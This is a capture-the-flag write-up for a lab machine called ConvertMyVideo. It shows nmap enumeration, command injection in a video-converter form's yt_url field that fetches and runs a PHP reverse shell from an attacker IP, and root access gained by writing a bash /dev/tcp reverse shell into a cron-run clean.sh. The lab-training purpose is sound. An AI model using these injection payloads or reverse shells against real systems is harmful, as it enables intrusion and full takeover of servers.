# ConvertMyVideo
> Silver Garcia - 08/05/2024

## Enumeration
Nmap
```
sudo nmap -T4 -A -p- 10.10.65.145
Nmap scan report for 10.10.65.145
Host is up (0.18s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=5/8%OT=22%CT=1%CU=32580%PV=Y%DS=2%DC=T%G=Y%TM=663BC
OS:0C9%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10F%TI=Z%CI=Z%TS=A)SEQ(SP
OS:=108%GCD=1%ISR=10B%TI=Z%TS=A)SEQ(SP=109%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)SEQ
OS:(SP=109%GCD=1%ISR=10D%TI=Z%TS=A)SEQ(SP=109%GCD=3%ISR=10D%TI=Z%CI=Z%TS=A)
OS:OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508
OS:ST11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
OS:ECN(R=N)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S
OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%
OS:A=Z%F=R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=)T7(R=N)T7
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+
OS:%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK
OS:=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   178.69 ms 10.8.0.1
2   179.30 ms 10.10.65.145
```

## Getting access
Found RCE vulnerability when trying to convert video on `http://10.10.65.245/`

POST request with vulnerability:
```
POST / HTTP/1.1

Host: 10.10.65.145

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 106

Origin: http://10.10.65.145

Connection: close

Referer: http://10.10.65.145/



yt_url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3Dhttps%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3D3z9Nhet21oo
```

The last line can be used to execute code. Used Burp Suite to get reverse shell.
1. Changed last line to download file:
```
yt_url=;wget${IFS%??}http://10.8.11.24:80/php-reverse-shell.php;
```
2. Set listener and execute file:
```
yt_url=;php${IFS%??}php-reverse-shell.php;
```

## Privilege escalation
Used `pspy` to get processes getting executed. Found that `clean.sh` is being executed as root and www-data has write access to it.

1. pspy output
```
2024/05/09 00:06:01 CMD: UID=0     PID=8989   | /bin/sh -c cd /var/www/html/tmp && bash /var/www/html/tmp/clean.sh                                        
2024/05/09 00:06:01 CMD: UID=0     PID=8987   | /usr/sbin/CRON -f 
```

2. clean.sh permissions
```bash
ls -la tmp
total 12
drwxr-xr-x 2 www-data www-data 4096 Apr 12  2020 .
drwxr-xr-x 6 www-data www-data 4096 May  9 00:05 ..
-rw-r--r-- 1 www-data www-data   17 Apr 12  2020 clean.sh
```

3. Changed file and set listener to get revere shell
```bash
echo "bash -i >& /dev/tcp/10.8.11.24/53 0>&1" > tmp/clean.sh
```
